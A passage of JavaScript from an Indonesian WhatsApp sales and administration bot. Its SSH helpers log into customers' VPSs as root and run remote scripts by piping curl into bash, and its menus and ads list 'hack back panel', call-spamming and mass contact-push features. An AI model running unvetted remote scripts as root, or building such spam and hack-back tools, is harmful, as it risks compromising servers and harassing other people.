          })
          .stderr.on("data", (data) => {
            console.log("STDERR:", data.toString());
          });
      });
    }).on("error", (err) => {
      console.log("Connection Error:", err);
      Rulzz.sendMessage(sock, { text: "❌ Katasandi atau IP tidak valid!" }, { quoted });
      reject(err);
    }).connect(ConnSettings);
  });
}

async function installTemaBilling(ipVps, pwVps, m, Reply) {
  return new Promise((resolve, reject) => {
    const ssh = new Client();
    const command = `bash <(curl -s https://raw.githubusercontent.com/RulzzML/Pterodactyl-Theme-Autoinstaller/main/install.sh)`;

    ssh.on("ready", () => {
      m.reply("Memulai instalasi *tema billing* Pterodactyl.\nHarap tunggu 1-10 menit...");

      ssh.exec(command, (err, stream) => {
        if (err) {
          console.log("EXEC ERROR:", err);
          m.reply("Terjadi kesalahan saat mengeksekusi perintah.");
          ssh.end();
          return reject(err);
        }

        stream
          .on("close", (code, signal) => {
            m.reply("✅ *Tema Billing berhasil diinstall!*");
            ssh.end();
            return resolve(true);
          })
          .on("data", (data) => {
            console.log("OUTPUT:", data.toString());
            stream.write(`rulzz\n`);
            stream.write(`1\n`);
            stream.write(`2\n`);
            stream.write(`yes\n`);
            stream.write(`x\n`);
          })
          .stderr.on("data", (data) => {
            console.log("STDERR:", data.toString());
          });
      });
    });

    ssh.on("error", (err) => {
      console.log("Connection Error:", err);
      m.reply("Katasandi atau IP tidak valid.");
      return reject(err);
    });

    ssh.connect({
      host: ipVps,
      port: 22,
      username: "root",
      password: pwVps,
    });
  });
}

async function listbut2(chat, teks, listnye, jm) {
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 999999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363338913902426@newsletter",
newsletterName: `Channel ${namaOwner}`,
serverMessageId: 145
}
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `RulzXD Bot V4 By Rulzz OfficiaL`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: ``,
thumbnailUrl: "",
gifPlayback: true,
subtitle: "",
hasMediaAttachment: true,
...(await prepareWAMessageMedia({ image: { url: './source/logo.jpg' } }, { upload: Rulzz.waUploadToServer })),
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listnye)
}],
}), })}
}}, {quoted: jm})
await Rulzz.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}

async function installTemaEnigma(ipVps, pwVps, m, Reply) {
  return new Promise((resolve, reject) => {
    const ssh = new Client();
    const command = `bash <(curl -s https://raw.githubusercontent.com/RulzzML/Pterodactyl-Theme-Autoinstaller/main/install.sh)`;

    ssh.on("ready", () => {
      m.reply("Memulai instalasi *tema Enigma* Pterodactyl.\nHarap tunggu 1-10 menit...");

      ssh.exec(command, (err, stream) => {
        if (err) {
          console.log("EXEC ERROR:", err);
          m.reply("Terjadi kesalahan saat mengeksekusi perintah.");
          ssh.end();
          return reject(err);
        }

        stream
          .on("close", () => {
            m.reply("✅ *Tema Enigma berhasil diinstall!*");
            ssh.end();
            return resolve(true);
          })
          .on("data", (data) => {
            console.log("OUTPUT:", data.toString());
            stream.write(`rulzz\n`);
            stream.write(`1\n`);
            stream.write(`3\n`);
            stream.write(`https://wa.me/6285133225752\n`);
            stream.write(`https://whatsapp.com/channel/0029VaprsPG6hENim13l6v23\n`);
            stream.write(`https://www.rulzzofficial.my.id\n`);
            stream.write(`yes\n`);
            stream.write(`x\n`);
          })
          .stderr.on("data", (data) => {
            console.log("STDERR:", data.toString());
          });
      });
    });

    ssh.on("error", (err) => {
      console.log("Connection Error:", err);
      m.reply("Katasandi atau IP tidak valid.");
      return reject(err);
    });

    ssh.connect({
      host: ipVps,
      port: 22,
      username: "root",
      password: pwVps,
    });
  });
}


async function installDepend(ipVps, pwVps, m, Reply) {
  return new Promise((resolve, reject) => {
    const ssh = new Client();
    const command = `bash <(curl -s https://raw.githubusercontent.com/RulzzML/installer-premium/refs/heads/main/zero.sh)`;

    ssh.on("ready", () => {
      m.reply("Memproses *install dependensi* Pterodactyl. Tunggu 1-10 menit...");

      ssh.exec(command, (err, stream) => {
        if (err) {
          console.log("EXEC ERROR:", err);
          m.reply("Terjadi kesalahan saat mengeksekusi perintah.");
          ssh.end();
          return reject(err);
        }

        stream
          .on("close", () => {
            m.reply("✅ *Dependensi berhasil diinstal!*");
            ssh.end();
            return resolve(true);
          })
          .on("data", (data) => {
            console.log("OUTPUT:", data.toString());
            stream.write("11\n");
            stream.write("A\n");
            stream.write("Y\n");
            stream.write("Y\n");
          })
          .stderr.on("data", (data) => {
            console.log("STDERR:", data.toString());
          });
      });
    });

    ssh.on("error", (err) => {
      console.log("Connection Error:", err);
      m.reply("Katasandi atau IP tidak valid.");
      return reject(err);
    });

    ssh.connect({
      host: ipVps,
      port: 22,
      username: "root",
      password: pwVps,
    });
  });
}

async function installTemaNebula(ipVps, pwVps, m, Reply) {
  return new Promise((resolve, reject) => {
    const ssh = new Client();
    const command = `bash <(curl -s https://raw.githubusercontent.com/RulzzML/installer-premium/refs/heads/main/zero.sh)`;

    ssh.on("ready", () => {
      m.reply("Memproses *install tema Nebula* Pterodactyl. Tunggu 1-10 menit...");

      ssh.exec(command, (err, stream) => {
        if (err) {
          console.log("EXEC ERROR:", err);
          m.reply("Terjadi kesalahan saat mengeksekusi perintah.");
          ssh.end();
          return reject(err);
        }

        stream
          .on("close", () => {
            m.reply("✅ *Tema Nebula berhasil diinstal!*");
            ssh.end();
            return resolve(true);
          })
          .on("data", (data) => {
            console.log("OUTPUT:", data.toString());
            stream.write("2\n");
            stream.write("\n");
            stream.write("\n");
          })
          .stderr.on("data", (data) => {
            console.log("STDERR:", data.toString());
          });
      });
    });

    ssh.on("error", (err) => {
      console.log("Connection Error:", err);
      m.reply("Katasandi atau IP tidak valid.");
      return reject(err);
    });

    ssh.connect({
      host: ipVps,
      port: 22,
      username: "root",
      password: pwVps,
    });
  });
}
const Reply = async (teks) => {
return Rulzz.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
isForwarded: true, 
forwardingScore: 9999, 
businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: `${botname}`, newsletterJid: global.idSaluran }, 
externalAdReply: {
title: botname, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: null, 
}}}, {quoted: null})
}

const slideButton = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: { url: global.image.logo }}, { upload: Rulzz.waUploadToServer })
const msgii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*Rulzz OfficiaL🔥* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*RULZZ OFFICIAL MENYEDIAKAN :*
- AKUN CLOUD
- VPS
- RESELLER PANEL
- ADMIN PANEL
- PARTNER PANEL
- OWNER PANEL
- SCRIPT BOT WA (MD, PUSHKONTAK, JAGA GRUB, DLL)
- SCRIPT BOT TELE
- RESELLER SUBDOMAIN
- DOMAIN MY.ID BIZ.ID 1 TAHUN
- JASA INSTALL PANEL
- JASA INSTALL TEMA PANEL
- JASA HACK BACK PANEL
- JASA RENAME/FIX/ADD SCRIPT BOT WHATSAPP
- SEWA BOT PUSH KONTAK
- SEWA BOT MD 1400+ FITUR
*DAN LAIN LAIN TANYAKAN SAJA🔥*
`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*VPS DIGITAL OCEAN*
RAM 1 CORE 1 : Rp15.000
RAM 2 CORE 1 : Rp20.000
RAM 2 CORE 2 : Rp25.000
RAM 4 CORE 2 : Rp35.000
RAM 8 CORE 4 : Rp45.000
RAM 16 CORE 4 : Rp60.000 

*Benefit / Keuntungannya*
- Free Install Panel
- Free Request Os, Versi, Region
- Free Request Subdomain
- High Quality Anti Delay
- Server 100% Milikmu
- Garansi 20 Hari (1x Klaim)
- VPS Aktif 25-30 Hari
- Bisa Jadi Host Minecraft
- Bisa Open RESELLER, ADP, PT, OWN PANEL
================================

*Grub Marketplace [OPEN] :*
https://chat.whatsapp.com/JvZpqqQGmsRCZxn2HgmHE6`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Panel Run Bot Private 🌟*

* Ram 1 GB : Rp1000
* Ram 2 GB : Rp2000
* Ram 3 GB : Rp3000
* Ram 4 GB : Rp4000
* Ram 5 GB : Rp5000
* Ram 6 Gb : Rp6000
* Ram 7 GB : Rp7000
* Ram 8 GB : Rp8000
* Ram 9 Gb : Rp9000
* Ram Unlimited : Rp12.000

*Syarat & Ketentuan :*
* _Server private & kualitas terbaik!_
* _Script bot dijamin aman (anti drama/maling)_
* _Garansi 20 hari_
* _Server anti delay/lemot!_
* _Claim garansi wajib bawa bukti transaksi_
* _Bisa Pasang All Sc_
* _Free Tutorial Kalo Ga Bisa Make_`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*🏡 Grub Terbuka 24 Jam*
- https://chat.whatsapp.com/JvZpqqQGmsRCZxn2HgmHE6
- https://chat.whatsapp.com/GeNmjck7q9g0uaxHFyNkG6
- https://chat.whatsapp.com/B5tuSdZMOR0KdF9nWkGPzF
- https://chat.whatsapp.com/HcGuwh79woBE8cyjFj2vMx
- https://chat.whatsapp.com/C2J6AmdFsRvHjfy8KYGjjn
- https://chat.whatsapp.com/CuJ8PCKTuu25Yqa0qQV2oI
- https://chat.whatsapp.com/Enye3v58KeL3qvg6fsMEjQ

*🏠 Channel Testimoni*
* https://whatsapp.com/channel/0029VaprsPG6hENim13l6v23`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Pterodactyl Akses 🌟*

* Reseller Panel Private : Rp10.000
* Reseller Panel Public : Rp7.000
* Admin Panel #1   : Rp18.000
* Admin Panel #2   : Rp15.000 
* Partner Panel #1  : Rp25.000
* Partner Panel #2  : Rp18.000
* Owner Panel #1   : Rp35.000
* Owner Panel #2   : Rp25.000

*Benefit Yang Di Dapat  :*
* _Kualitas terbaik!_
* _Script bot dijamin aman (anti drama/maling)_
* _Garansi 15 hari_
* _Server anti delay/lemot!_
* _Claim garansi wajib bawa bukti transaksi_
* _Bisa Pasang All Sc_
* _Free Tutorial Kalo Ga Bisa Make_
* _Kalo Owner Panel #1 Dapet 4 Server Panel_`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*Produk Lainnya🌟*

* Jasa Install Panel : Rp5.000
* Jasa Fix Node Merah : Rp5.000
* Jasa Install Tema : Rp8.000
* Reseller Subdomain : Rp7.000
* Murid Nokos 41 Website : Rp5.000
* Domain my.id 1 Tahun : Rp15.000
* Domain biz.id 1 Tahun : Rp15.000
* Script Bot Wa Buy Otomatis : Rp20.000
* Script Bot Wa Jpm 24 Jam : Rp10.000
* Script RulzXD 3.0 : Rp30.000
* Reseller Subdomain : Rp7.000`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qlocJpm})
await Rulzz.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
}

//============= [ COMMANDS ] ====================================================
switch (command) {
case 'menu': {
  let path = "./source/logo.jpg";
  let saldo = db.users[m.sender].saldo || 0;
  let totalfitur = await TotalFitur();
  let page = (args[0] && !isNaN(args[0])) ? Number(args[0]) : 1;

  const teksnya = `
*▧ 𝙄 𝙉 𝙁 𝙊 𝙍 𝙈 𝘼 𝙎 𝙄 - 𝘽 𝙊 𝙏*
• Nama       : *${global.botname2}*
• Versi      : *${global.versi}*
• Type       : *Case (CJS)*
• Mode       : *${Rulzz.public ? "Public" : "Self"}*
• Creator    : *${global.owner}*
• Runtime    : *${runtime(os.uptime())}*
• Total Fitur: *${totalfitur} Fitur*

*▧ 𝙄 𝙉 𝙁 𝙊 𝙍 𝙈 𝘼 𝙎 𝙄 - 𝙐 𝙎 𝙀 𝙍*
• Status     : *${isCreator ? "Owner" : isPremium ? "Premium" : "Free"}*
• Saldo      : *Rp${await toIDR(saldo)}*

*— ᴛǫ ᴛᴏ*
⳺ ᴀʟʟᴀʜ sᴡᴛ
⳺ ɴᴀʙɪ ᴍᴜʜᴀᴍᴍᴀᴅ sᴀᴡ
⳺ ᴏʀᴀɴɢ ᴛᴜᴀ ᴋᴜ
⳺ ᴀᴍᴅ ʜᴏsᴛɪɴɢ
⳺ ᴘᴇᴍʙᴇʟɪ sᴄʀɪᴘᴛ ɪɴɪ
`;

  // Semua menu yang ingin ditampilkan
  const allButtons = [
    { id: ".allmenu", text: "📜 All Menu" },
    { id: ".buymenu", text: "💰 Buy Menu" },
    { id: ".othermenu", text: "📦 Other Menu" },
    { id: ".searchmenu", text: "🔍 Search Menu" },
    { id: ".toolsmenu", text: "🛠 Tools Menu" },
    { id: ".downloadmenu", text: "⬇️ Download Menu" },
    { id: ".jbmenu", text: "🤖 JB Menu" },
    { id: ".storemenu", text: "🏪 Store Menu" },
    { id: ".domenu", text: "🌐 Digital Ocean" },
    { id: ".do2menu", text: "☁️ Digital Ocean 2" },
    { id: ".cpanelmenu", text: "🧩 Cpanel Menu" },
    { id: ".cpanel2menu", text: "🧩 Cpanel 2 Menu" },
    { id: ".subdomenu", text: "🕸 Subdomain Menu" },
    { id: ".vpsmenu", text: "💻 VPS Menu" },
    { id: ".grubmenu", text: "👥 Group Menu" },
    { id: ".ownermenu", text: "👑 Owner Menu" },
    { id: ".setting", text: "⚙️ Setting Bot" },
    { id: ".backupnow", text: "💾 Backup Database" },
    { id: ".script", text: "📂 Identitas Script" },
    { id: ".dev", text: "👨‍💻 Developer Script" }
  ];

  // Pagination (5 tombol per halaman)
  const perPage = 5;
  const totalPages = Math.ceil(allButtons.length / perPage);
  const start = (page - 1) * perPage;
  const end = start + perPage;
  const pageButtons = allButtons.slice(start, end);

  // Tambah tombol navigasi
  if (page < totalPages) pageButtons.push({ id: `.menu ${page + 1}`, text: "⏭ Next" });
  if (page > 1) pageButtons.unshift({ id: `.menu ${page - 1}`, text: "⏮ Back" });

  return Rulzz.sendMessage(m.chat, {
    image: fs.readFileSync(path),
    caption: teksnya,
    footer: `📄 Halaman ${page}/${totalPages}`,
    buttons: pageButtons.map(v => ({
      buttonId: v.id,
      buttonText: { displayText: v.text },
      type: 1
    })),
    headerType: 4,
    contextInfo: {
      isForwarded: true,
      mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
    }
  }, { quoted: qtoko });
}
break;

case "allmenu": {
let teks = `
*▧ 𝙄 𝙉 𝙁 𝙊 𝙍 𝙈 𝘼 𝙎 𝙄 - 𝘽 𝙊 𝙏*
• Nama     : *${global.botname2}*
• Versi    : *${global.versi}*
• Mode     : *${Rulzz.public ? "Public" : "Self"}*
• Creator  : *${global.owner}*
• Runtime  : *${runtime(os.uptime())}*

*▧ 𝙄 𝙉 𝙁 𝙊 𝙍 𝙈 𝘼 𝙎 𝙄 - 𝙐 𝙎 𝙀 𝙍*
• Status   : *${isCreator ? "Owner" : isPremium ? "Premium" : "Free"}*

*── Othermenu*
  • .cekidch
  • .cekidgc
  • .qc
  • .brat
  • .bratvid
  • .emojigif
  • .emojimix
  • .readviewonce
  • .sticker
  • .stickerwm
  • .report
  • .get
  • .block
  • .unblock
  • .delete
  • .spamcall

*── Searchmenu*
  • .yts
  • .pinterest
  • .gimage
  • .spotifysearch
  • .tiktoksearch

*── Toolsmenu*
  • .ai
  • .simi
  • .tourl
  • .ssweb
  • .translate
  • .tohd
  • .shortlink
  • .shortlink2
  • .enc
  • .reactch
  • .encrypt
  • .encrypthard

*── Downloadmenu*
  • .tiktok
  • .tiktokmp3
  • .instagram
  • .ytmp3
  • .ytmp4
  • .play
  • .playvid
  • .spotifydl
  • .gitclone

*── Storemenu*
  • .addrespon
  • .delrespon
  • .listrespon
  • .done
  • .proses
  • .jpm
  • .jpmht
  • .jpmslide
  • .jpmslideht
  • .jpmtesti
  • .sendtesti
  • .pushkontak
  • .pushkontak2
  • .payment
  • .produk
  • .upswtag
  • .jpmch

*── Digitaloceanmenu*
  • .r1c1
  • .r2c1
  • .r4c2
  • .r8c4
  • .r16c4
  • .buatvps
  • .buyvps
  • .sisadroplet
  • .deldroplet
  • .listdroplet
  • .rebuild
  • .restartvps
  
*── Digitaloceanmenu 2*
  • .r1c1-v2
  • .r2c1-v2
  • .r4c2-v2
  • .r8c4-v2
  • .r16c4-v2
  • .buatvps-v2
  • .buyvps-v2
  • .sisadroplet-v2
  • .deldroplet-v2
  • .listdroplet-v2
  • .rebuild-v2
  • .restartvps-v2

*── Panelmenu*
  • .addseller
  • .delseller
  • .listseller
  • .addpremall
  • .delpremall
  • .1gb
  • .2gb
  • .3gb
  • .4gb
  • .5gb
  • .6gb
  • .7gb
  • .8gb
  • .9gb
  • .10gb
  • .unlimited
  • .cadmin
  • .delpanel
  • .deladmin
  • .listpanel
  • .listadmin
  • .delpanelall
  
*── Panelmenu 2*
  • .addseller-v2
  • .delseller-v2
  • .listseller-v2
  • .1gb-v2
  • .2gb-v2
  • .3gb-v2
  • .4gb-v2
  • .5gb-v2
  • .6gb-v2
  • .7gb-v2
  • .8gb-v2
  • .9gb-v2
  • .10gb-v2
  • .unlimited-v2
  • .cadmin-v2
  • .delpanel-v2
  • .deladmin-v2
  • .listpanel-v2
  • .listadmin-v2

*── Vpsmenu*
  • .hackbackpanel
  • .gantipwvps
  • .installpanel
  • .installtemastellar
  • .installtemabilling
  • .installtemaenigma
  • .installdepend
  • .uninstallpanel
  • .uninstalltema

*── Groupmenu*
  • .antilink
  • .antilink2
  • .blacklistjpm
  • .welcome
  • .add
  • .kick
  • .close
  • .open
  • .hidetag
  • .kudetagc
  • .leave
  • .tagall
  • .promote
  • .demote
  • .resetlinkgc
  • .linkgc

*── Buymenu*
  • .deposit
  • .saldo
  • .ceksaldo
  • .tambahsaldo
  • .kurangisaldo
  • .transfer
  • .reffund
  • .terimareffund
  • .tolakreffund
  • .buypanel
  • .buysubdo
  • .buyvps
  • .buyscript
  • .buyegg
  • .buydo

*── Ownermenu*
  • .clearsession
  • .settingsbot
  • .addowner
  • .listowner
  • .delowner
  • .addstokdo
  • .delstokdo
  • .liststokdo
  • .autoread
  • .autopromosi
  • .autoreadsw
  • .autotyping
  • .setppbot
  • .clearchat
  • .resetdb
  • .backupsc
  • .getcase
  • .listgc
  • .joingc
  • .joinch
  • .upchannel
  • .addidch
  • .listidch
  • .delidch
  • .addsc
  • .listsc
  • .delsc

*𝙍𝙪𝙡𝙯𝙓𝘿 𝘽𝙤𝙩𝙯 𝙑4*
`
m.reply(teks)
}
break

case "othermenu": {
    let teks = `*— ᴏᴛʜᴇʀ ᴍᴇɴᴜ*
⳺ .cekidch
⳺ .cekidgc
⳺ .qc
⳺ .brat
⳺ .bratvid
⳺ .emojigif
⳺ .emojimix
⳺ .readviewonce
⳺ .sticker
⳺ .stickerwm
⳺ .report
⳺ .get
⳺ .block
⳺ .unblock
⳺ .delete
⳺ .spamcall`;
    await Rulzz.sendMessage(m.chat, { 
        text: teks, 
        mentions: [m.sender], 
        contextInfo: {
            externalAdReply: {
                title: `List All Fitur Other Menu`, 
                body: `© Powered By ${namaOwner}`, 
                thumbnailUrl: global.image.reply, 
                sourceUrl: linkSaluran,
            }
        }
    }, { quoted: null });
}
break

case "setting": {
    let teks = `*— sᴇᴛᴛɪɴɢ ʙᴏᴛ ᴍᴇɴᴜ*
⳺ .autoread
⳺ .autoreadsw
⳺ .autoreadgc
⳺ .anticall
⳺ .autopromosi
⳺ .autotyping`;
    await Rulzz.sendMessage(m.chat, { 
        text: teks, 
        mentions: [m.sender], 
        contextInfo: {
            externalAdReply: {
                title: `List Fitur Setting Bot Menu`, 
                body: `© Powered By ${namaOwner}`, 
                thumbnailUrl: global.image.reply, 
                sourceUrl: linkSaluran,
            }
        }
    }, { quoted: null });
}
break

case "searchmenu": {
    let teks = `*— sᴇᴀʀᴄʜ ᴍᴇɴᴜ*
⳺ .yts
⳺ .pinterest
⳺ .tiktoksearch
⳺ .cekcuaca
⳺ .spotifysearch
⳺ .gimage`;
    await Rulzz.sendMessage(m.chat, { 
        text: teks, 
        mentions: [m.sender], 
        contextInfo: {
            externalAdReply: {
                title: `List All Fitur Search Menu`, 
                body: `© Powered By ${namaOwner}`, 
                thumbnailUrl: global.image.reply, 
                sourceUrl: linkSaluran,
            }
        }
    }, { quoted: null });
}
break

case "toolsmenu": {
    let teks = `*— ᴛᴏᴏʟs ᴍᴇɴᴜ*
⳺ .ai
⳺ .simi
⳺ .tourl
⳺ .tourl2
⳺ .ssweb
⳺ .translate
⳺ .tohd
⳺ .shortlink
⳺ .shortlink2
⳺ .enc
⳺ .emojimix
⳺ .emojigif
⳺ .reactch
⳺ .encrypt
⳺ .encrypthard`;
    await Rulzz.sendMessage(m.chat, { 
        text: teks, 
        mentions: [m.sender], 
        contextInfo: {
            externalAdReply: {
                title: `List All Fitur Tools Menu`, 
                body: `© Powered By ${namaOwner}`, 
                thumbnailUrl: global.image.reply, 
                sourceUrl: linkSaluran,
            }
        }
    }, { quoted: null });
}
break

case "downmenu": 
case "downloadmenu": {
    let teks = `*— ᴅᴏᴡɴʟᴏᴀᴅᴇʀ ᴍᴇɴᴜ*
⳺ .tiktok
⳺ .tiktokmp3
⳺ .tiktoksearch
⳺ .spotifydl
⳺ .instagram
⳺ .ytmp3
⳺ .ytmp4
⳺ .play
⳺ .playvid
⳺ .gitclone
⳺ .mediafire`;
    await Rulzz.sendMessage(m.chat, { 
        text: teks, 
        mentions: [m.sender], 
        contextInfo: {
            externalAdReply: {
                title: `List All Fitur Downloader Menu`, 
                body: `© Powered By ${namaOwner}`, 
                thumbnailUrl: global.image.reply, 
                sourceUrl: linkSaluran,
            }
        }
    }, { quoted: null });
}
break

case "jbmenu": {
    let teks = `*— ᴊʙ ᴍᴇɴᴜ*
⳺ .formatjᴘ
⳺ .formatneed
⳺ .feerekbᴇʀ`;
    await Rulzz.sendMessage(m.chat, { 
        text: teks, 
        mentions: [m.sender], 
        contextInfo: {
            externalAdReply: {
                title: `List All Fitur JB Menu`, 
                body: `© Powered By ${namaOwner}`, 
                thumbnailUrl: global.image.reply, 
                sourceUrl: linkSaluran,
            }
        }
    }, { quoted: null });
}
break

case "storemenu": {
    let teks = `*— sᴛᴏʀᴇ ᴍᴇɴᴜ*
⳺ .addrespon
⳺ .delrespon
⳺ .listrespon
⳺ .done
⳺ .proses
⳺ .jpm
⳺ .jpmht
⳺ .jpmslide
⳺ .jpmslideht
⳺ .jpmtesti
⳺ .sendtesti
⳺ .pushkontak
⳺ .pushkontak2
⳺ .payment
⳺ .produk
⳺ .jpmch
⳺ .reactch`;
    await Rulzz.sendMessage(m.chat, { 
        text: teks, 
        mentions: [m.sender], 
        contextInfo: {
            externalAdReply: {
                title: `List All Fitur Store Menu`, 
                body: `© Powered By ${namaOwner}`, 
                thumbnailUrl: global.image.reply, 
                sourceUrl: linkSaluran,
            }
        }
    }, { quoted: null });
}
break

case "domenu": case "do1menu": {
    let teks = `*— ᴅɪɢɪᴛᴀʟ ᴏᴄᴇᴀɴ ᴍᴇɴᴜ ᴠ1*
⳺ .r1c1
⳺ .r2c1
⳺ .r4c2
⳺ .r8c4
⳺ .r16c4
⳺ .buatvps
⳺ .sisadroplet
⳺ .deldroplet
⳺ .listdroplet
⳺ .rebuild
⳺ .restartvps`;
    await Rulzz.sendMessage(m.chat, { 
        text: teks, 
        mentions: [m.sender], 
        contextInfo: {
            externalAdReply: {
                title: `List All Fitur Digital Ocean Menu V1`, 
                body: `© Powered By ${namaOwner}`, 
                thumbnailUrl: global.image.reply, 
                sourceUrl: linkSaluran,
            }
        }
    }, { quoted: null });
}
break

case "do2menu": {
    let teks = `*— ᴅɪɢɪᴛᴀʟ ᴏᴄᴇᴀɴ ᴍᴇɴᴜ ᴠ2*
⳺ .r1c1-v2
⳺ .r2c1-v2
⳺ .r4c2-v2
⳺ .r8c4-v2
⳺ .r16c4-v2
⳺ .buatvps-v2
⳺ .sisadroplet-v2
⳺ .deldroplet-v2
⳺ .listdroplet-v2
⳺ .rebuild-v2
⳺ .restartvps-v2`;
    await Rulzz.sendMessage(m.chat, { 
        text: teks, 
        mentions: [m.sender], 
        contextInfo: {
            externalAdReply: {
                title: `List All Fitur Digital Ocean Menu V2`, 
                body: `© Powered By ${namaOwner}`, 
                thumbnailUrl: global.image.reply, 
                sourceUrl: linkSaluran,
            }
        }
    }, { quoted: null });
}
break

case "cpanelmenu": case "panelmenu": {
    let teks = `*— ᴘᴀɴᴇʟ ᴍᴇɴᴜ ᴠ1*
⳺ .addseller
⳺ .delseller
⳺ .listseller
⳺ .addpremall
⳺ .delpremall
⳺ .1gb
⳺ .2gb
⳺ .3gb
⳺ .4gb
⳺ .5gb
⳺ .6gb
⳺ .7gb
⳺ .8gb
⳺ .9gb
⳺ .10gb
⳺ .unlimited
⳺ .cadmin
⳺ .delpanel
⳺ .deladmin
⳺ .listsrv
⳺ .addsrv
⳺ .listadmin
⳺ .delpanelall`;
    await Rulzz.sendMessage(m.chat, { 
        text: teks, 
        mentions: [m.sender], 
        contextInfo: {
            externalAdReply: {
                title: `List All Fitur Panel Menu V1`, 
                body: `© Powered By ${namaOwner}`, 
                thumbnailUrl: global.image.reply, 
                sourceUrl: linkSaluran,
            }
        }
    }, { quoted: null });
}
break

case "panel2menu": case "cpanel2menu": {
    let teks = `*— ᴘᴀɴᴇʟ ᴍᴇɴᴜ ᴠ2*
⳺ .addsellerprivate
⳺ .delsellerprivate
⳺ .listsellerprivate
⳺ .1gb-v2
⳺ .2gb-v2
⳺ .3gb-v2
⳺ .4gb-v2
⳺ .5gb-v2
⳺ .6gb-v2
⳺ .7gb-v2
⳺ .8gb-v2
⳺ .9gb-v2
⳺ .10gb-v2
⳺ .unlimited-v2
⳺ .cadmin-v2
⳺ .delpanel-v2
⳺ .deladmin-v2
⳺ .listsrv-v2
⳺ .addsrv-v2
⳺ .listadmin-v2`;
    await Rulzz.sendMessage(m.chat, { 
        text: teks, 
        mentions: [m.sender], 
        contextInfo: {
            externalAdReply: {
                title: `List All Fitur Panel Menu V2`, 
                body: `© Powered By ${namaOwner}`, 
                thumbnailUrl: global.image.reply, 
                sourceUrl: linkSaluran,
            }
        }
    }, { quoted: null });
}
break

case "subdomenu": {
    let teks = `*— sᴜʙᴅᴏᴍᴀɪɴ ᴍᴇɴᴜ*
⳺ .addredo
⳺ .delredo
⳺ .listredo
⳺ .subdo`;
    await Rulzz.sendMessage(m.chat, { 
        text: teks, 
        mentions: [m.sender], 
        contextInfo: {
            externalAdReply: {
                title: `List All Fitur Subdomain Menu`, 
                body: `© Powered By ${namaOwner}`, 
                thumbnailUrl: global.image.reply, 
                sourceUrl: linkSaluran,
            }
        }
    }, { quoted: null });
}
break

case "vpsmenu": case "sshmenu": {
    let teks = `*— ᴠᴘs ᴍᴇɴᴜ*
⳺ .hackbackpanel
⳺ .gantipwvps
⳺ .installpanel
⳺ .installtemastellar
⳺ .installtemabilling
⳺ .installtemaenigma
⳺ .installdepend
⳺ .uninstallpanel
⳺ .uninstalltema`;
    await Rulzz.sendMessage(m.chat, { 
        text: teks, 
        mentions: [m.sender], 
        contextInfo: {
